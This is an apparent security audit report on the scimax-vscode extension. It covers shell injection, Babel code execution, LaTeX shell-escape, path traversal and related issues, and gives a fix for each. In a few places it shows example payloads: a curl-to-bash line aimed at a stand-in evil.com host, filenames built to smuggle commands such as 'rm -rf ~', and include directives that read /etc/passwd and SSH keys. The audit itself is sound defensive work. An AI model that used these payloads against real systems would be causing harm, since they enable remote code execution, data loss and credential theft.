# Security Audit Report: Scimax VS Code Extension

**Date**: 2026-01-17
**Auditor**: Red Team Security Review
**Scope**: Full codebase security assessment

---

## Executive Summary

This security audit identified **11 vulnerabilities** across the scimax-vscode extension, ranging from **CRITICAL** to **LOW** severity. The most serious issues involve **command injection** through unsafe shell execution and **arbitrary code execution** via the Babel source block system. Several design decisions prioritize functionality over security, which is understandable for a scientific computing tool but requires user awareness.

### Risk Overview

| Severity | Count | Categories |
|----------|-------|------------|
| CRITICAL | 3 | Command injection, arbitrary code execution |
| HIGH | 3 | Path traversal, LaTeX shell-escape, temp file race |
| MEDIUM | 4 | Jupyter network exposure, file reads, regex DoS potential |
| LOW | 1 | API key storage |
| NONE | 2 | SQL injection (properly parameterized), XSS (properly escaped) |

---

## Critical Vulnerabilities

### 1. Unsafe Shell Execution with `shell: true` [CRITICAL]

**Files Affected**:
- `src/org/imageOverlayProvider.ts` (lines 682, 709, 728, 764, 791)
- `src/org/latexPreviewProvider.ts` (lines 509, 530, 716)
- `src/org/latexLivePreview.ts` (lines 481, 693, 797)

**Description**: Multiple `spawn()` calls use `shell: true`, enabling shell metacharacter interpretation. This allows command injection if image paths or other inputs contain shell metacharacters.

**Vulnerable Code Example** (`imageOverlayProvider.ts:682`):
```typescript
const proc = spawn('convert', args, { shell: true });
```

**Attack Vector**: A malicious image path like `image$(whoami).png` or `image;rm -rf ~;.png` could execute arbitrary commands.

**Recommendation**: Remove `shell: true` and pass arguments as arrays:
```typescript
const proc = spawn('convert', [sourcePath, '-thumbnail', `${width}x${height}>`, destPath]);
```

---

### 2. Arbitrary Code Execution via Babel [CRITICAL]

**Files Affected**: `src/parser/orgBabel.ts`

**Description**: The Babel execution system is **designed** to execute arbitrary code from org-mode source blocks. While this is intentional functionality (matching Emacs org-mode behavior), it poses inherent security risks.

**Execution Methods**:
- **Shell** (line 443): Raw shell commands via `/bin/bash -c`
- **Python** (line 548): `exec(compile(code, '<org-babel>', 'exec'), __session_globals__)`
- **JavaScript** (line 810): `spawn('node', ['-e', fullCode], ...)`
- **TypeScript** (lines 880-946): Writes to temp file, then executes

**Risk**: Any org file can execute arbitrary system commands when source blocks are evaluated.

**Recommendation**:
1. Add user confirmation before executing untrusted code blocks
2. Consider sandbox options (containers, restricted shells)
3. Add `:eval no` by default for files from untrusted sources
4. Warn users when opening org files with executable blocks

---

### 3. Predictable Temporary File Names [CRITICAL/HIGH]

**File**: `src/parser/orgBabel.ts` (lines 880-882)

**Vulnerable Code**:
```typescript
const tmpDir = os.tmpdir();
const tmpFile = path.join(tmpDir, `babel-${Date.now()}.ts`);
fs.writeFileSync(tmpFile, fullCode, 'utf-8');
```

**Description**: Temporary files use predictable names based on timestamps. An attacker could pre-create or race to replace these files.

**Recommendation**: Use cryptographically random filenames:
```typescript
const crypto = require('crypto');
const tmpFile = path.join(tmpDir, `babel-${crypto.randomBytes(16).toString('hex')}.ts`);
```

---

## High Severity Vulnerabilities

### 4. LaTeX `-shell-escape` Enables Command Execution [HIGH]

**File**: `src/org/exportProvider.ts` (lines 437-456)

**Vulnerable Code**:
```typescript
return `latexmk -lualatex -bibtex -shell-escape -interaction=nonstopmode ...`;
```

**Description**: The `-shell-escape` flag allows LaTeX documents to execute shell commands via `\immediate\write18{...}`. A malicious org file could embed:
```latex
\immediate\write18{curl evil.com/malware | bash}
```

**Recommendation**:
1. Remove `-shell-escape` by default
2. Add configuration option to enable it with warning
3. Document the security implications

---

### 5. Path Traversal in Include Directive [HIGH]

**File**: `src/parser/orgInclude.ts` (lines 350-355)

**Vulnerable Code**:
```typescript
function resolveIncludePath(filePath: string, basePath: string): string {
    if (path.isAbsolute(filePath)) {
        return filePath;  // No validation!
    }
    return path.resolve(basePath, filePath);
}
```

**Attack Vector**:
```org
#+INCLUDE: "/etc/passwd"
#+INCLUDE: "../../../.ssh/id_rsa"
```

**Description**: Absolute paths are accepted without validation. While `path.resolve()` normalizes relative paths, there's no check to ensure the resolved path stays within the project directory.

**Recommendation**:
```typescript
function resolveIncludePath(filePath: string, basePath: string): string {
    const resolved = path.resolve(basePath, filePath);
    // Validate path stays within workspace
    const workspaceRoot = vscode.workspace.workspaceFolders?.[0]?.uri.fsPath;
    if (workspaceRoot && !resolved.startsWith(workspaceRoot)) {
        // Warn user about out-of-workspace include
        vscode.window.showWarningMessage(`Include path outside workspace: ${filePath}`);
    }
    return resolved;
}
```

---

### 6. Unvalidated File Reads [HIGH]

**File**: `src/database/scimaxDb.ts` (line 501)

**Code**:
```typescript
const content = fs.readFileSync(filePath, 'utf8');
```

**Description**: Files are read based on paths from file system watchers and user input without validation against allowed directories.

**Also Affected**: `src/org/exportProvider.ts` bibliography file reading.

---

## Medium Severity Vulnerabilities

### 7. Jupyter Kernel Network Exposure [MEDIUM]

**File**: `src/jupyter/kernelConnection.ts`

**Description**: The Jupyter kernel system:
- Connects to ZeroMQ sockets (potentially over network)
- Uses HMAC-SHA256 for authentication (good)
- Reads connection info from JSON files
- Spawns kernel processes from kernel.json specs

**Risks**:
- Malicious kernel.json could specify arbitrary executables
- Network connections could be intercepted (though HMAC helps)
- Compromised kernels have full access

**Recommendation**: Validate kernel.json contents, restrict to local connections.

---

### 8. JSON Deserialization from Kernels [MEDIUM]

**File**: `src/jupyter/kernelConnection.ts` (lines 187-194)

**Code**:
```typescript
const message: JupyterMessage<T> = {
    header: JSON.parse(headerStr),
    parent_header: JSON.parse(parentStr),
    metadata: JSON.parse(metadataStr),
    content: JSON.parse(contentStr),
    buffers: buffers.length > 0 ? buffers : undefined,
};
```

**Description**: While `JSON.parse()` is generally safe in JavaScript (no code execution), large or deeply nested payloads could cause memory issues.

**Recommendation**: Add payload size limits and schema validation.

---

### 9. Regex Denial of Service Potential [MEDIUM]

**Files**: Various parser files use complex regexes

**Example** (`src/parser/orgInclude.ts`):
```typescript
const INCLUDE_PATTERN = /^#\+INCLUDE:\s*"([^"]+)"(.*)$/im;
```

**Description**: While these specific patterns appear safe, complex regex with nested quantifiers could be vulnerable to ReDoS with crafted input.

**Recommendation**: Audit all regex patterns with tools like safe-regex.

---

### 10. Configuration-Based Path Access [MEDIUM]

**File**: `src/database/scimaxDb.ts` (lines 348-356)

**Code**:
```typescript
private loadIgnorePatterns(): void {
    const config = vscode.workspace.getConfiguration('scimax.db');
    this.ignorePatterns = config.get<string[]>('ignorePatterns') || [...];
}
```

**Description**: Ignore patterns from user configuration are passed to minimatch. While minimatch itself is safe, malformed patterns could cause unexpected behavior.

---

## Low Severity Issues

### 11. API Key Storage [LOW]

**File**: `src/database/commands.ts` (line 354)

**Code**:
```typescript
await config.update('openaiApiKey', apiKey, vscode.ConfigurationTarget.Global);
```

**Description**: OpenAI API keys are stored in VS Code's settings (which are stored in plain text on disk). This is standard practice for VS Code extensions but users should be aware.

**Recommendation**: Document this in security notes. Consider using VS Code SecretStorage API for sensitive credentials.

---

## Verified Secure Implementations

### SQL Injection Protection [SECURE]

**File**: `src/database/scimaxDb.ts`

The codebase correctly uses parameterized queries throughout:
```typescript
const result = await this.db.execute({
    sql: 'SELECT mtime FROM files WHERE path = ?',
    args: [filePath]  // Properly parameterized
});
```

**Status**: No SQL injection vulnerabilities found.

---

### XSS Prevention in HTML Export [SECURE]

**File**: `src/parser/orgExport.ts` (lines 381-400)

HTML escaping is properly implemented:
```typescript
export function escapeString(str: string, format: 'html' | 'latex'): string {
    if (format === 'html') {
        return str
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;');
    }
}
```

**Status**: Properly escaped throughout export system.

---

## Recommendations Summary

### Immediate Actions (Priority 1)

1. **Remove `shell: true`** from all spawn() calls
2. **Remove `-shell-escape`** from default LaTeX compilation
3. **Use crypto.randomBytes()** for temp file names
4. **Add path validation** for include directives

### Short-Term Actions (Priority 2)

1. Add user confirmation before Babel code execution
2. Implement size limits for Jupyter message deserialization
3. Validate kernel.json before launching kernels
4. Audit regex patterns for ReDoS vulnerabilities

### Long-Term Actions (Priority 3)

1. Consider sandboxing options for code execution
2. Migrate API key storage to SecretStorage API
3. Add security-focused documentation for users
4. Implement Content Security Policy for webviews

---

## Security Model Considerations

This extension is designed for **scientific computing** where code execution is a core feature. The security model assumes:

1. **Users trust the org files they open** (similar to Emacs org-mode)
2. **Workspace files may contain executable code** (intentional behavior)
3. **Users understand that source blocks execute real commands**

The vulnerabilities identified should be viewed through this lens - some "risks" are actually intended features (Babel execution), while others (shell injection via `shell: true`) are genuine bugs.

---

## Conclusion

The scimax-vscode extension has several security issues that should be addressed, particularly the command injection vulnerabilities from `shell: true` usage. However, many findings relate to the inherent nature of the tool (executing user code), which is consistent with its Emacs scimax heritage.

The codebase shows good security practices in some areas (SQL parameterization, HTML escaping) while having gaps in others (shell execution, path validation). The recommendations above should be prioritized based on the threat model and user base expectations.
